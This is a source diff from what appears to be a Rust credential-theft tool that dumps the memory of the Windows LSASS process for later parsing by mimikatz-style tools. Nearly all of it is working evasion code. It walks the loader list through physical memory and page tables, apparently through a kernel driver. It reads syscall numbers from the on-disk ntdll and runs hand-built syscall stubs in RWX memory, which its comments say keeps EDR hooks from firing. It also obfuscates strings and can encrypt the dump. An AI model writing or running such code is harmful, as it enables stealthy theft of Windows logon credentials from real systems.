@@ -225,10 +225,691 @@ where
     Ok(dump_size)
 }
 
+/// Create minidump with ZERO user-mode ntdll calls.
+///
+/// - Module enumeration: reads LSASS PEB → LDR chain via physical memory (CR3)
+/// - Memory region enumeration: kernel-mode ZwQueryVirtualMemory (via trampoline)
+/// - Memory data read: physical memory (CR3 page table walk)
+///
+/// The only remaining user-mode operations are `collect_system_info()` (reads
+/// KUSER_SHARED_DATA + GetSystemInfo) and `std::fs::write()` (file I/O).
+pub fn create_minidump_full_phys<F>(
+    engine: &crate::winio64::DmEngine,
+    process: HANDLE,
+    pid: u32,
+    cr3: u64,
+    read_phys: &F,
+    output_path: &str,
+    encrypt: bool,
+) -> Result<u64, String>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    // 1. Get system info (reads KUSER_SHARED_DATA — no ntdll, no hook)
+    println!("    Collecting system info...");
+    let sys_info = collect_system_info();
+
+    // 2. Enumerate modules via physical memory (PEB → LDR, zero ntdll calls)
+    println!("    Enumerating modules via physical memory...");
+    let modules = enumerate_modules_phys(engine, pid, cr3, read_phys)
+        .map_err(|e| format!("Module enumeration (phys) failed: {}", e))?;
+    println!("    Found {} modules", modules.len());
+
+    // 3. Enumerate memory regions via direct syscall + hybrid read
+    println!("    Enumerating regions via direct syscall (hybrid read)...");
+    let regions = read_memory_regions_direct_syscall(process, cr3, read_phys)
+        .map_err(|e| format!("Direct syscall region enum failed: {}", e))?;
+
+    let total_mem: u64 = regions.iter().map(|r| r.size).sum();
+    println!(
+        "    Read {} regions, {:.2} MB total",
+        regions.len(),
+        total_mem as f64 / 1048576.0
+    );
+
+    // 4. Build minidump
+    println!("    Assembling minidump...");
+    let mut dump = build_minidump(&sys_info, &modules, &regions);
+
+    // 5. Optionally encrypt
+    if encrypt {
+        println!("    Encrypting dump...");
+        dump = crypto::encrypt_dump(&mut dump);
+    }
+
+    // 6. Write to disk
+    let dump_size = dump.len() as u64;
+    std::fs::write(output_path, &dump).map_err(|e| format!("Failed to write dump: {}", e))?;
+
+    Ok(dump_size)
+}
+
+/// Enumerate LSASS modules via physical memory — zero ntdll calls.
+///
+/// Reads the target process PEB → Ldr → InLoadOrderModuleList chain
+/// entirely through CR3 page-table translation + physical memory reads.
+fn enumerate_modules_phys<F>(
+    engine: &crate::winio64::DmEngine,
+    pid: u32,
+    cr3: u64,
+    read_phys: &F,
+) -> Result<Vec<ModuleInfo>, String>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    let mut modules_out = Vec::new();
+
+    // 1. Get PEB VA via kernel-mode PsGetProcessPeb
+    let peb_va = engine.get_process_peb(pid)?;
+    println!("    [phys] PEB at VA 0x{:X}", peb_va);
+
+    // 2. Read PEB.Ldr (offset 0x18 on x64)
+    let ldr_va = read_u64_via_phys(cr3, peb_va + 0x18, read_phys)?;
+    if ldr_va == 0 || ldr_va < 0x10000 {
+        return Err(format!("Invalid PEB.Ldr: 0x{:X}", ldr_va));
+    }
+    println!("    [phys] PEB_LDR_DATA at 0x{:X}", ldr_va);
+
+    // 3. Read InLoadOrderModuleList.Flink (offset 0x10 in PEB_LDR_DATA)
+    let list_head_va = ldr_va + 0x10; // &InLoadOrderModuleList
+    let first_entry = read_u64_via_phys(cr3, list_head_va, read_phys)?;
+    if first_entry == 0 {
+        return Err("InLoadOrderModuleList.Flink is NULL".into());
+    }
+
+    // 4. Walk the doubly-linked list
+    let mut current = first_entry;
+    let mut iterations = 0u32;
+
+    loop {
+        if iterations > 512 {
+            break; // safety limit
+        }
+        iterations += 1;
+
+        // current points to the InLoadOrderLinks field (offset 0x0 of LDR_DATA_TABLE_ENTRY)
+        // Check if we've looped back to list_head
+        if current == list_head_va && iterations > 1 {
+            break;
+        }
+
+        // LDR_DATA_TABLE_ENTRY layout (x64):
+        //   0x00: InLoadOrderLinks (LIST_ENTRY: Flink, Blink = 16 bytes)
+        //   0x10: InMemoryOrderLinks
+        //   0x20: InInitializationOrderLinks
+        //   0x30: DllBase (PVOID)
+        //   0x38: EntryPoint (PVOID)
+        //   0x40: SizeOfImage (ULONG)
+        //   0x48: FullDllName (UNICODE_STRING: Length u16, MaxLength u16, pad u32, Buffer *u16)
+        //   0x58: BaseDllName (UNICODE_STRING)
+        //   0x80: TimeDateStamp (ULONG)
+
+        // Read DllBase
+        let dll_base = match read_u64_via_phys(cr3, current + 0x30, read_phys) {
+            Ok(v) => v,
+            Err(_) => {
+                // Try next entry
+                current = match read_u64_via_phys(cr3, current, read_phys) {
+                    Ok(v) => v,
+                    Err(_) => break,
+                };
+                continue;
+            }
+        };
+
+        if dll_base == 0 {
+            // Skip empty entries, advance to next
+            current = match read_u64_via_phys(cr3, current, read_phys) {
+                Ok(v) => v,
+                Err(_) => break,
+            };
+            continue;
+        }
+
+        // Read SizeOfImage
+        let size_of_image = match read_u32_via_phys(cr3, current + 0x40, read_phys) {
+            Ok(v) => v,
+            Err(_) => 0,
+        };
+
+        // Read FullDllName UNICODE_STRING
+        let name = read_unicode_string_phys(cr3, current + 0x48, read_phys)
+            .unwrap_or_else(|_| format!("unknown_{:X}", dll_base));
+
+        // Convert NT device path to DOS path if needed
+        let name = if name.starts_with("\\") {
+            nt_device_path_to_dos(&name)
+        } else {
+            name
+        };
+
+        modules_out.push(ModuleInfo {
+            base: dll_base,
+            size: size_of_image,
+            name,
+        });
+
+        // Advance: read Flink (offset 0x0)
+        current = match read_u64_via_phys(cr3, current, read_phys) {
+            Ok(v) => v,
+            Err(_) => break,
+        };
+        if current == first_entry || current == list_head_va {
+            break; // full circle
+        }
+    }
+
+    if modules_out.is_empty() {
+        return Err("No modules found via physical memory walk".into());
+    }
+
+    Ok(modules_out)
+}
+/// Enumerate committed memory regions via DIRECT SYSCALLS (no ntdll hooks),
+/// read data via HYBRID approach: CR3 physical read first, NtReadVirtualMemory
+/// syscall fallback only for paged-out pages.
+///
+/// 1. Reads ntdll.dll from DISK to get clean syscall numbers
+/// 2. Builds fresh syscall stubs in RWX memory — EDR hooks never fire
+/// 3. Enumerates regions with NtQueryVirtualMemory syscall
+/// 4. For each page: try CR3 physical read (invisible to EDR) first;
+///    only fall back to NtReadVirtualMemory for paged-out pages (~40%)
+fn read_memory_regions_direct_syscall<F>(
+    process: HANDLE,
+    cr3: u64,
+    read_phys: &F,
+) -> Result<Vec<MemRegion>, String>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    // 1. Get syscall numbers from clean on-disk ntdll
+    let ssn_query = get_syscall_number("NtQueryVirtualMemory")?;
+    let ssn_read = get_syscall_number("NtReadVirtualMemory")?;
+    println!("    [syscall] NtQueryVirtualMemory SSN: 0x{:X}", ssn_query);
+    println!("    [syscall] NtReadVirtualMemory  SSN: 0x{:X}", ssn_read);
+
+    // 2. Build both syscall stubs in a single RWX page
+    let build_stub = |ssn: u32| -> [u8; 12] {
+        [
+            0x4C, 0x8B, 0xD1,                           // mov r10, rcx
+            0xB8,                                        // mov eax, <SSN>
+            (ssn & 0xFF) as u8,
+            ((ssn >> 8) & 0xFF) as u8,
+            ((ssn >> 16) & 0xFF) as u8,
+            ((ssn >> 24) & 0xFF) as u8,
+            0x0F, 0x05,                                  // syscall
+            0xC3,                                        // ret
+            0x90,                                        // nop
+        ]
+    };
+
+    let stub_page = unsafe {
+        windows::Win32::System::Memory::VirtualAlloc(
+            None,
+            0x1000,
+            windows::Win32::System::Memory::MEM_COMMIT
+                | windows::Win32::System::Memory::MEM_RESERVE,
+            windows::Win32::System::Memory::PAGE_EXECUTE_READWRITE,
+        )
+    };
+    if stub_page.is_null() {
+        return Err("VirtualAlloc for syscall stubs failed".into());
+    }
+
+    let query_stub = build_stub(ssn_query);
+    let read_stub = build_stub(ssn_read);
+    unsafe {
+        std::ptr::copy_nonoverlapping(query_stub.as_ptr(), stub_page as *mut u8, 12);
+        std::ptr::copy_nonoverlapping(
+            read_stub.as_ptr(),
+            (stub_page as *mut u8).add(0x10),
+            12,
+        );
+    }
+
+    // 3. Cast to function pointers
+    type FnNtQueryVirtualMemory =
+        unsafe extern "system" fn(isize, *const u8, u32, *mut u8, usize, *mut usize) -> i32;
+    type FnNtReadVirtualMemory =
+        unsafe extern "system" fn(isize, *const u8, *mut u8, usize, *mut usize) -> i32;
+
+    let nt_query_vm: FnNtQueryVirtualMemory = unsafe { std::mem::transmute(stub_page) };
+    let nt_read_vm: FnNtReadVirtualMemory =
+        unsafe { std::mem::transmute((stub_page as *const u8).add(0x10)) };
+
+    // 4. Enumerate regions and read page-by-page (hybrid)
+    #[repr(C)]
+    #[derive(Default)]
+    struct MemBasicInfo {
+        base_address: u64,
+        allocation_base: u64,
+        allocation_protect: u32,
+        _pad1: u32,
+        region_size: u64,
+        state: u32,
+        protect: u32,
+        type_: u32,
+        _pad2: u32,
+    }
+
+    let mut regions = Vec::new();
+    let mut address: u64 = 0;
+    let mut pages_phys: u64 = 0;   // pages read via physical memory
+    let mut pages_syscall: u64 = 0; // pages read via NtReadVirtualMemory fallback
+
+    loop {
+        let mut mbi = MemBasicInfo::default();
+        let mut ret_len = 0usize;
+        let status = unsafe {
+            nt_query_vm(
+                process.0 as isize,
+                address as *const u8,
+                0, // MemoryBasicInformation
+                &mut mbi as *mut _ as *mut u8,
+                std::mem::size_of::<MemBasicInfo>(),
+                &mut ret_len,
+            )
+        };
+
+        if status < 0 || ret_len == 0 {
+            break;
+        }
+
+        // MEM_COMMIT=0x1000, readable and not guarded
+        let protect = mbi.protect;
+        if mbi.state == 0x1000
+            && (protect == 0x02
+                || protect == 0x04
+                || protect == 0x08
+                || protect == 0x20
+                || protect == 0x40
+                || protect == 0x80)
+            && protect & 0x100 == 0
+        {
+            let region_size = mbi.region_size as usize;
+            let mut buffer = vec![0u8; region_size];
+            let mut offset = 0usize;
+
+            // Read page-by-page: CR3 physical first, syscall fallback
+            while offset < region_size {
+                let page_va = mbi.base_address + offset as u64;
+                let page_offset_in_page = (page_va & 0xFFF) as usize;
+                let chunk_size = std::cmp::min(0x1000 - page_offset_in_page, region_size - offset);
+
+                // Try 1: Physical memory via CR3 page table walk (invisible to EDR)
+                let phys_ok = if let Ok(pa) = translate_va_to_pa(cr3, page_va, read_phys) {
+                    read_phys(pa, &mut buffer[offset..offset + chunk_size]).is_ok()
+                } else {
+                    false
+                };
+
+                if phys_ok {
+                    pages_phys += 1;
+                } else {
+                    // Try 2: NtReadVirtualMemory syscall fallback (only for paged-out pages)
+                    let mut page_read = 0usize;
+                    let read_status = unsafe {
+                        nt_read_vm(
+                            process.0 as isize,
+                            page_va as *const u8,
+                            buffer[offset..].as_mut_ptr(),
+                            chunk_size,
+                            &mut page_read,
+                        )
+                    };
+                    if read_status >= 0 && page_read > 0 {
+                        pages_syscall += 1;
+                    }
+                    // If both fail, leave zeros (truly inaccessible page)
+                }
+
+                offset += chunk_size;
+            }
+
+            if buffer.iter().any(|&b| b != 0) {
+                regions.push(MemRegion {
+                    base: mbi.base_address,
+                    size: buffer.len() as u64,
+                    data: buffer,
+                });
+            }
+        }
+
+        address = mbi.base_address + mbi.region_size;
+        if address == 0 {
+            break;
+        }
+    }
+
+    // 5. Free the stubs
+    unsafe {
+        let _ = windows::Win32::System::Memory::VirtualFree(
+            stub_page,
+            0,
+            windows::Win32::System::Memory::MEM_RELEASE,
+        );
+    }
+
+    let total_pages = pages_phys + pages_syscall;
+    if total_pages > 0 {
+        println!(
+            "    [hybrid] {} pages via phys ({:.1}%), {} pages via syscall ({:.1}%)",
+            pages_phys,
+            100.0 * pages_phys as f64 / total_pages as f64,
+            pages_syscall,
+            100.0 * pages_syscall as f64 / total_pages as f64,
+        );
+    }
+
+    if regions.is_empty() {
+        return Err("No readable memory regions found via direct syscall".into());
+    }
+
+    Ok(regions)
+}
+
+/// Extract a syscall number (SSN) from the on-disk ntdll.dll.
+///
+/// Reads the clean copy from C:\Windows\System32\ntdll.dll, finds the
+/// export, and reads the `mov eax, <SSN>` instruction from the stub.
+/// This avoids any in-memory hooks placed by EDRs.
+fn get_syscall_number(func_name: &str) -> Result<u32, String> {
+    let path = obfstr::obfstr!("C:\\Windows\\System32\\ntdll.dll").to_string();
+    let data = std::fs::read(&path).map_err(|e| format!("Read ntdll failed: {}", e))?;
+
+    let rva = find_ntdll_export_rva(&data, func_name)?;
+    let file_offset = rva_to_file_offset_ntdll(&data, rva)?;
+
+    // Verify stub pattern: 4C 8B D1 B8 xx xx xx xx
+    if file_offset + 8 > data.len() {
+        return Err("Stub too short".into());
+    }
+    if data[file_offset] == 0x4C
+        && data[file_offset + 1] == 0x8B
+        && data[file_offset + 2] == 0xD1
+        && data[file_offset + 3] == 0xB8
+    {
+        let ssn = u32::from_le_bytes(
+            data[file_offset + 4..file_offset + 8]
+                .try_into()
+                .unwrap(),
+        );
+        Ok(ssn)
+    } else {
+        Err(format!(
+            "Not a valid syscall stub at RVA 0x{:X}: {:02X} {:02X} {:02X} {:02X}",
+            rva,
+            data[file_offset],
+            data[file_offset + 1],
+            data[file_offset + 2],
+            data[file_offset + 3],
+        ))
+    }
+}
+
+/// Find an exported function RVA in the ntdll PE data (from disk).
+fn find_ntdll_export_rva(data: &[u8], func_name: &str) -> Result<u32, String> {
+    let pe_off = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
+    let opt_off = pe_off + 24;
+    let export_rva =
+        u32::from_le_bytes(data[opt_off + 112..opt_off + 116].try_into().unwrap()) as usize;
+    let export_size =
+        u32::from_le_bytes(data[opt_off + 116..opt_off + 120].try_into().unwrap()) as usize;
+
+    if export_rva == 0 {
+        return Err("No export directory in ntdll".into());
+    }
+
+    let num_sections =
+        u16::from_le_bytes(data[pe_off + 6..pe_off + 8].try_into().unwrap()) as usize;
+    let opt_hdr_size =
+        u16::from_le_bytes(data[pe_off + 20..pe_off + 22].try_into().unwrap()) as usize;
+    let sections_off = pe_off + 24 + opt_hdr_size;
+
+    let rva_to_offset = |rva: usize| -> Option<usize> {
+        for i in 0..num_sections {
+            let s = sections_off + i * 40;
+            let vaddr = u32::from_le_bytes(data[s + 12..s + 16].try_into().unwrap()) as usize;
+            let vsize = u32::from_le_bytes(data[s + 8..s + 12].try_into().unwrap()) as usize;
+            let raw_off = u32::from_le_bytes(data[s + 20..s + 24].try_into().unwrap()) as usize;
+            if rva >= vaddr && rva < vaddr + vsize {
+                return Some(raw_off + (rva - vaddr));
+            }
+        }
+        None
+    };
+
+    let exp_off = rva_to_offset(export_rva).ok_or("map export dir RVA")?;
+    let num_names =
+        u32::from_le_bytes(data[exp_off + 24..exp_off + 28].try_into().unwrap()) as usize;
+    let addr_table_rva =
+        u32::from_le_bytes(data[exp_off + 28..exp_off + 32].try_into().unwrap()) as usize;
+    let name_table_rva =
+        u32::from_le_bytes(data[exp_off + 32..exp_off + 36].try_into().unwrap()) as usize;
+    let ord_table_rva =
+        u32::from_le_bytes(data[exp_off + 36..exp_off + 40].try_into().unwrap()) as usize;
+
+    let name_table_off = rva_to_offset(name_table_rva).ok_or("map name table")?;
+    let ord_table_off = rva_to_offset(ord_table_rva).ok_or("map ord table")?;
+    let addr_table_off = rva_to_offset(addr_table_rva).ok_or("map addr table")?;
+
+    for i in 0..num_names {
+        let name_rva = u32::from_le_bytes(
+            data[name_table_off + i * 4..name_table_off + i * 4 + 4]
+                .try_into()
+                .unwrap(),
+        ) as usize;
+        let name_off = match rva_to_offset(name_rva) {
+            Some(o) => o,
+            None => continue,
+        };
+        let end = data[name_off..]
+            .iter()
+            .position(|&b| b == 0)
+            .unwrap_or(256);
+        let name = std::str::from_utf8(&data[name_off..name_off + end]).unwrap_or("");
+
+        if name == func_name {
+            let ordinal = u16::from_le_bytes(
+                data[ord_table_off + i * 2..ord_table_off + i * 2 + 2]
+                    .try_into()
+                    .unwrap(),
+            ) as usize;
+            let func_rva = u32::from_le_bytes(
+                data[addr_table_off + ordinal * 4..addr_table_off + ordinal * 4 + 4]
+                    .try_into()
+                    .unwrap(),
+            );
+            if (func_rva as usize) >= export_rva && (func_rva as usize) < export_rva + export_size
+            {
+                return Err(format!("{} is forwarded", func_name));
+            }
+            return Ok(func_rva);
+        }
+    }
+    Err(format!("'{}' not found in ntdll exports", func_name))
+}
+
+/// Convert an RVA to a file offset using ntdll PE section headers.
+fn rva_to_file_offset_ntdll(data: &[u8], rva: u32) -> Result<usize, String> {
+    let pe_off = u32::from_le_bytes(data[0x3C..0x40].try_into().unwrap()) as usize;
+    let num_sections =
+        u16::from_le_bytes(data[pe_off + 6..pe_off + 8].try_into().unwrap()) as usize;
+    let opt_hdr_size =
+        u16::from_le_bytes(data[pe_off + 20..pe_off + 22].try_into().unwrap()) as usize;
+    let sections_off = pe_off + 24 + opt_hdr_size;
+
+    for i in 0..num_sections {
+        let s = sections_off + i * 40;
+        let vaddr = u32::from_le_bytes(data[s + 12..s + 16].try_into().unwrap()) as usize;
+        let vsize = u32::from_le_bytes(data[s + 8..s + 12].try_into().unwrap()) as usize;
+        let raw_off = u32::from_le_bytes(data[s + 20..s + 24].try_into().unwrap()) as usize;
+        if (rva as usize) >= vaddr && (rva as usize) < vaddr + vsize {
+            return Ok(raw_off + (rva as usize - vaddr));
+        }
+    }
+    Err(format!("RVA 0x{:X} not in any section", rva))
+}
 /// Translate virtual address to physical address via x64 4-level page table walk.
 ///
 /// CR3 → PML4 → PDPT → PD → PT → Physical Page
 /// Supports 4KB pages, 2MB large pages, and 1GB huge pages.
+fn read_u64_via_phys<F>(cr3: u64, va: u64, read_phys: &F) -> Result<u64, String>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    let pa = translate_va_to_pa(cr3, va, read_phys)?;
+    let mut buf = [0u8; 8];
+    read_phys(pa, &mut buf)?;
+    Ok(u64::from_le_bytes(buf))
+}
+
+fn read_u32_via_phys<F>(cr3: u64, va: u64, read_phys: &F) -> Result<u32, String>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    let pa = translate_va_to_pa(cr3, va, read_phys)?;
+    let mut buf = [0u8; 4];
+    read_phys(pa, &mut buf)?;
+    Ok(u32::from_le_bytes(buf))
+}
+
+fn read_unicode_string_phys<F>(cr3: u64, va: u64, read_phys: &F) -> Result<String, String>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    // UNICODE_STRING (x64): len u16 @ +0, max_len u16 @ +2, _pad u32 @ +4, buffer *u16 @ +8
+    let len = {
+        let pa = translate_va_to_pa(cr3, va, read_phys)?;
+        let mut buf = [0u8; 2];
+        read_phys(pa, &mut buf)?;
+        u16::from_le_bytes(buf) as usize
+    };
+    if len == 0 || len > 1024 {
+        return Err("Invalid UNICODE_STRING length".into());
+    }
+    let buffer_ptr = read_u64_via_phys(cr3, va + 8, read_phys)?;
+    if buffer_ptr == 0 {
+        return Err("NULL UNICODE_STRING buffer".into());
+    }
+
+    let mut raw = vec![0u8; len];
+    let mut offset = 0;
+    while offset < len {
+        let chunk_va = buffer_ptr + offset as u64;
+        let page_off = (chunk_va & 0xFFF) as usize;
+        let chunk_size = std::cmp::min(0x1000 - page_off, len - offset);
+        if let Ok(pa) = translate_va_to_pa(cr3, chunk_va, read_phys) {
+            let _ = read_phys(pa, &mut raw[offset..offset + chunk_size]);
+        }
+        offset += chunk_size;
+    }
+
+    let u16s: Vec<u16> = raw
+        .chunks_exact(2)
+        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+        .collect();
+    Ok(String::from_utf16_lossy(&u16s))
+}
+
+/// Read a virtual memory region via physical memory using page table walk.
+fn read_region_phys<F>(cr3: u64, va: u64, size: usize, read_phys: &F) -> Vec<u8>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    let mut result = vec![0u8; size];
+    let mut offset = 0usize;
+    while offset < size {
+        let current_va = va + offset as u64;
+        let page_offset = (current_va & 0xFFF) as usize;
+        let chunk_size = std::cmp::min(0x1000 - page_offset, size - offset);
+        if let Ok(pa) = translate_va_to_pa(cr3, current_va, read_phys) {
+            let _ = read_phys(pa, &mut result[offset..offset + chunk_size]);
+        }
+        offset += chunk_size;
+    }
+    result
+}
+
+/// Read committed memory regions via physical memory (sfdrv mode).
+fn read_memory_regions_phys<F>(
+    api: &ApiResolver,
+    process: HANDLE,
+    cr3: u64,
+    read_phys: &F,
+) -> Result<Vec<MemRegion>, String>
+where
+    F: Fn(u64, &mut [u8]) -> Result<(), String>,
+{
+    type FnNtQueryVirtualMemory =
+        unsafe extern "system" fn(isize, *const u8, u32, *mut u8, usize, *mut usize) -> i32;
+    let nt_query_vm: FnNtQueryVirtualMemory = unsafe {
+        std::mem::transmute(
+            api.ntdll(resolver::HASH_NT_QUERY_VIRTUAL_MEMORY)
+                .ok_or("Failed to resolve NtQueryVirtualMemory")?,
+        )
+    };
+
+    #[repr(C)]
+    #[derive(Default)]
+    struct MemBasicInfo {
+        base_address: u64,
+        allocation_base: u64,
+        allocation_protect: u32,
+        _pad1: u32,
+        region_size: u64,
+        state: u32,
+        protect: u32,
+        type_: u32,
+        _pad2: u32,
+    }
+
+    let mut regions = Vec::new();
+    let mut address: u64 = 0;
+
+    loop {
+        let mut mbi = MemBasicInfo::default();
+        let mut ret_len = 0usize;
+        let status = unsafe {
+            nt_query_vm(
+                process.0 as isize,
+                address as *const u8,
+                0,
+                &mut mbi as *mut _ as *mut u8,
+                std::mem::size_of::<MemBasicInfo>(),
+                &mut ret_len,
+            )
+        };
+        if status < 0 || ret_len == 0 {
+            break;
+        }
+        let protect = mbi.protect;
+        if mbi.state == 0x1000
+            && (protect == 0x02 || protect == 0x04 || protect == 0x08
+                || protect == 0x20 || protect == 0x40 || protect == 0x80)
+            && protect & 0x100 == 0
+        {
+            let region_size = mbi.region_size as usize;
+            let data = read_region_phys(cr3, mbi.base_address, region_size, read_phys);
+            if data.iter().any(|&b| b != 0) {
+                regions.push(MemRegion {
+                    base: mbi.base_address,
+                    size: data.len() as u64,
+                    data,
+                });
+            }
+        }
+        address = mbi.base_address + mbi.region_size;
+        if address == 0 { break; }
+    }
+
+    if regions.is_empty() {
+        return Err("No readable memory regions found via physical memory".into());
+    }
+    Ok(regions)
+}
+
+/// Translate virtual address to physical address via CR3 page table walk.
 fn translate_va_to_pa<F>(cr3: u64, va: u64, read_phys: &F) -> Result<u64, String>
 where
     F: Fn(u64, &mut [u8]) -> Result<(), String>,
@@ -277,189 +958,27 @@ where
 
     Ok((pte & 0x000F_FFFF_FFFF_F000) | (va & 0xFFF))
 }
-
-/// Read a virtual memory region via physical memory using page table walk.
-/// Reads page-by-page, translating each VA to PA.
-fn read_region_phys<F>(cr3: u64, va: u64, size: usize, read_phys: &F) -> Vec<u8>
-where
-    F: Fn(u64, &mut [u8]) -> Result<(), String>,
-{
-    let mut result = vec![0u8; size];
-    let mut offset = 0usize;
-
-    while offset < size {
-        let current_va = va + offset as u64;
-        let page_offset = (current_va & 0xFFF) as usize;
-        let chunk_size = std::cmp::min(0x1000 - page_offset, size - offset);
-
-        if let Ok(pa) = translate_va_to_pa(cr3, current_va, read_phys) {
-            let _ = read_phys(pa, &mut result[offset..offset + chunk_size]);
-        }
-        // If page not present, leave zeros — this is normal for paged-out memory
-
-        offset += chunk_size;
-    }
-    result
-}
-
-/// Read committed memory regions via physical memory — no NtReadVirtualMemory calls.
-///
-/// Uses NtQueryVirtualMemory (dynamic, class 0) to enumerate regions,
-/// then reads each region via CR3 page table walk + physical memory read.
-fn read_memory_regions_phys<F>(
-    api: &ApiResolver,
-    process: HANDLE,
-    cr3: u64,
-    read_phys: &F,
-) -> Result<Vec<MemRegion>, String>
-where
-    F: Fn(u64, &mut [u8]) -> Result<(), String>,
-{
-    let mut regions = Vec::new();
-    let mut address: u64 = 0;
-
-    // Resolve NtQueryVirtualMemory dynamically for region enumeration
-    type FnNtQueryVirtualMemory =
-        unsafe extern "system" fn(isize, *const u8, u32, *mut u8, usize, *mut usize) -> i32;
-    let nt_query_vm: FnNtQueryVirtualMemory = unsafe {
-        std::mem::transmute(
-            api.ntdll(resolver::HASH_NT_QUERY_VIRTUAL_MEMORY)
-                .ok_or("Failed to resolve NtQueryVirtualMemory")?,
-        )
-    };
-
-    // MEMORY_BASIC_INFORMATION struct for NtQueryVirtualMemory(class=0)
-    #[repr(C)]
-    #[derive(Default)]
-    struct MemBasicInfo {
-        base_address: u64,
-        allocation_base: u64,
-        allocation_protect: u32,
-        _pad1: u32,
-        region_size: u64,
-        state: u32,
-        protect: u32,
-        type_: u32,
-        _pad2: u32,
-    }
-
-    loop {
-        let mut mbi = MemBasicInfo::default();
-        let mut ret_len = 0usize;
-        let status = unsafe {
-            nt_query_vm(
-                process.0 as isize,
-                address as *const u8,
-                0, // MemoryBasicInformation
-                &mut mbi as *mut _ as *mut u8,
-                std::mem::size_of::<MemBasicInfo>(),
-                &mut ret_len,
-            )
-        };
-
-        if status < 0 || ret_len == 0 {
-            break;
-        }
-
-        // MEM_COMMIT=0x1000, readable and not guarded
-        let protect = mbi.protect;
-        if mbi.state == 0x1000 // MEM_COMMIT
-            && (protect == 0x02  // PAGE_READONLY
-                || protect == 0x04  // PAGE_READWRITE
-                || protect == 0x08  // PAGE_WRITECOPY
-                || protect == 0x20  // PAGE_EXECUTE_READ
-                || protect == 0x40  // PAGE_EXECUTE_READWRITE
-                || protect == 0x80) // PAGE_EXECUTE_WRITECOPY
-            && protect & 0x100 == 0
-        // Not PAGE_GUARD
-        {
-            let region_size = mbi.region_size as usize;
-            // Read via physical memory — completely bypasses NtReadVirtualMemory
-            let data = read_region_phys(cr3, mbi.base_address, region_size, read_phys);
-
-            // Only include regions where we actually read non-zero data
-            if data.iter().any(|&b| b != 0) {
-                regions.push(MemRegion {
-                    base: mbi.base_address,
-                    size: data.len() as u64,
-                    data,
-                });
-            }
-        }
-
-        address = mbi.base_address + mbi.region_size;
-        if address == 0 {
-            break;
-        }
-    }
-
-    if regions.is_empty() {
-        return Err("No readable memory regions found via physical memory".into());
-    }
-
-    Ok(regions)
-}
-
 fn collect_system_info() -> MinidumpSystemInfo {
-    // IMPORTANT: GetVersionExW lies on Win10/11 — returns 6.2 (Win8) without manifest.
-    // mimikatz/pypykatz use build_number to select lsasrv.dll offsets, so wrong version
-    // = wrong patterns = "ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list".
-    // Use RtlGetVersion from ntdll which ALWAYS returns the real OS version.
-    #[repr(C)]
-    struct RtlOsVersionInfoW {
-        size: u32,
-        major: u32,
-        minor: u32,
-        build: u32,
-        platform_id: u32,
-        csd_version: [u16; 128],
-    }
+    // Read OS version from KUSER_SHARED_DATA at 0x7FFE0000.
+    // This is a kernel-mapped read-only page visible in user-mode.
+    // CANNOT be hooked, shimmed, or lied about (unlike RtlGetVersion/GetVersionExW).
+    //
+    // Layout (stable since NT 4.0):
+    //   +0x026C  NtMajorVersion  : u32
+    //   +0x0270  NtMinorVersion  : u32
+    //   +0x0260  NtBuildNumber   : u32  (low 16 bits = build number)
+    //
+    // This is the DEFINITIVE source of truth for OS version.
+    let kuser: *const u8 = 0x7FFE0000usize as *const u8;
 
-    let mut info = RtlOsVersionInfoW {
-        size: std::mem::size_of::<RtlOsVersionInfoW>() as u32,
-        major: 0,
-        minor: 0,
-        build: 0,
-        platform_id: 0,
-        csd_version: [0u16; 128],
-    };
-
-    unsafe {
-        // RtlGetVersion is exported by ntdll.dll and always returns real version
-        let ntdll =
-            windows::Win32::System::LibraryLoader::GetModuleHandleW(windows::core::w!("ntdll.dll"));
-        if let Ok(ntdll) = ntdll {
-            let proc = windows::Win32::System::LibraryLoader::GetProcAddress(
-                ntdll,
-                windows::core::s!("RtlGetVersion"),
-            );
-            if let Some(func) = proc {
-                type FnRtlGetVersion = unsafe extern "system" fn(*mut RtlOsVersionInfoW) -> i32;
-                let rtl_get_version: FnRtlGetVersion = std::mem::transmute(func);
-                let _ = rtl_get_version(&mut info);
-            }
-        }
-    }
-
-    // Fallback: if RtlGetVersion failed, info fields will be 0
-    // This shouldn't happen but guard against it
-    if info.build == 0 {
-        let mut os_info = OSVERSIONINFOW {
-            dwOSVersionInfoSize: std::mem::size_of::<OSVERSIONINFOW>() as u32,
-            ..Default::default()
-        };
-        unsafe {
-            let _ = GetVersionExW(&mut os_info);
-        }
-        info.major = os_info.dwMajorVersion;
-        info.minor = os_info.dwMinorVersion;
-        info.build = os_info.dwBuildNumber;
-        info.platform_id = 2;
-    }
+    let major = unsafe { *(kuser.add(0x026C) as *const u32) };
+    let minor = unsafe { *(kuser.add(0x0270) as *const u32) };
+    let build_raw = unsafe { *(kuser.add(0x0260) as *const u32) };
+    let build = build_raw & 0xFFFF; // low 16 bits = build number
 
     println!(
-        "    OS Version: {}.{} Build {}",
-        info.major, info.minor, info.build
+        "    OS Version: {}.{} Build {} (from KUSER_SHARED_DATA)",
+        major, minor, build
     );
 
     let mut sys = SYSTEM_INFO::default();
@@ -472,10 +991,10 @@ fn collect_system_info() -> MinidumpSystemInfo {
         processor_level: sys.wProcessorLevel,
         processor_revision: sys.wProcessorRevision,
         number_of_processors: sys.dwNumberOfProcessors as u8,
-        product_type: 0,
-        major_version: info.major,
-        minor_version: info.minor,
-        build_number: info.build,
+        product_type: 1, // VER_NT_WORKSTATION
+        major_version: major,
+        minor_version: minor,
+        build_number: build,
         platform_id: 2, // VER_PLATFORM_WIN32_NT
         csd_version_rva: 0,
         suite_mask: 0,
@@ -766,11 +1285,19 @@ fn build_minidump(
     let dir_size = num_streams as usize * std::mem::size_of::<MinidumpDirectory>();
     buf.resize(header_size + dir_size, 0);
 
+    // --- CSD Version String (empty, but must be a valid MINIDUMP_STRING) ---
+    let csd_rva = buf.len() as u32;
+    buf.extend_from_slice(&0u32.to_le_bytes()); // Length = 0
